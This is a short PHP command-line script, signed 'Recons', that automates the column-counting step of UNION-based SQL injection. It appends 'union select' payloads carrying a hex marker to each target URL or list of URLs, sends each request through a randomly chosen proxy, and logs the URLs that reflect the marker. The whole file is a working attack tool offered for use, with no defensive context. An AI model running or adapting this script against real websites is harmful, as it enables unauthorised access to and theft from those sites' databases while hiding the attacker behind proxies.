<?php

/*
 * Get Number of Columns v1.0
 * by Recons
 * 
 * First arg is URL or TXT file
 */

set_time_limit(0);

$debug = TRUE;

if(!isset($argv[1]))
  echo "Usage: {$argv[0]} [url|file]\r\nArgument is either an URL (starting with http://) or .txt file";
else
{
  $url = $argv[1];
  if(strpos($url, 'http://') === FALSE && strpos($url, '.txt') !== FALSE) {
    $data = file_get_contents($url);
    $urls = explode("\n", $data);
  } else {
    $urls = array($url);
  }
  
  require("proxy.php");
  
  $u = 0;
  foreach($urls as $url) {
    $u++;
    echo "$u $url\r\n";
    
    $url = trim($url);
    if((strrpos($url, "'") === strlen($url) - 1)) // Url ends with '
      $url = trim($url, "'");
    $url = $url."+union+select+";
    
    for($n = 0; $n < 35; $n++) {
      $cur = $url;
      
      for($i = 0; $i <= $n; $i++) {
        $cur .= "0x723363306E";//($i + 1);
        $cur .= ",";
      }
      $cur = trim($cur, ",");
      
      $cxt = array(
        'http' => array(
            'proxy' => 'tcp://'.$proxies[mt_rand(0, count($proxies) - 1)],
            'request_fulluri' => true,
        ),
      );
      $context = stream_context_create($cxt);
      
      $data = file_get_contents($cur, FALSE, $context);
      
      if(strpos($data, 'r3c0n') !== FALSE) {
        echo "Possibly found at '$cur'\r\n";
        file_put_contents("columns_output.txt", "$cur\r\n", FILE_APPEND);
      }
    }
  }
}
?>